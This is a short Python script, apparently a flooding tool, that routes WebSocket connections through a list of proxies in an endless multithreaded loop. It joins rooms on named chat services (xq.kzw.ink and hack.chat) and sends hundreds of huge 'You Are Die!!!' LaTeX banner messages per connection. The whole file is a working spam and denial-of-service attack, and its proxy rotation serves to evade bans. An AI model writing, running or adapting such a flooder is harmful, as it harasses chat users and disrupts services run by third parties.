import re,json,random,time
from threading import Thread
from websocket import create_connection


def bomb(hphp,wsurl="wss://xq.kzw.ink/ws",channel="xq102210"): #wss://hack.chat/chat-ws your-channel
	try:
		# Dont change the code!
		ws = create_connection(wsurl,http_proxy_host=hphp[0],http_proxy_port=int(hphp[1]),timeout=5)

	except Exception as error:
		# dont change
		pass

	else:
		try:
			print(f"{hphp[0]}:{hphp[1]} starts fighting")
			

			if wsurl == "wss://xq.kzw.ink/ws":
				ws.send(json.dumps({"cmd":"join","channel":channel,"nick":"light","client_key":"XChatYYDS_","murmur":"510eaa890a19c95df5d7c1ffef25cthb","show":1,"head":":)I M YOU YOU ARE ME"}))
				
				for i in range(500):
					...

			if wsurl == "wss://hack.chat/chat-ws":
				ws.send(json.dumps({"cmd":"join","nick":str(random.randint(100000,999999)),"channel":channel}))
				for i in range(500):
					ws.send(json.dumps({"cmd":"chat","text":"$$\\Huge\\color{green}{You\\ Are\\ Die!!!}$$\n===\n"*70}))
			

			print(f"{hphp[0]}:{hphp[1]}'s life is valuable!!")

			# You can choose to close the ws connection after attacking
			# ws.close()

		except Exception as error:
			pass
		
proxy = '''
Your proxies here
'''


proxy_list = set(re.findall(r"([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\:([0-9]+)",proxy))


while True:
	for hp in proxy_list:
		try:
			Thread(target=bomb,args=((hp[0],hp[1]),)).start()
		except:
			pass
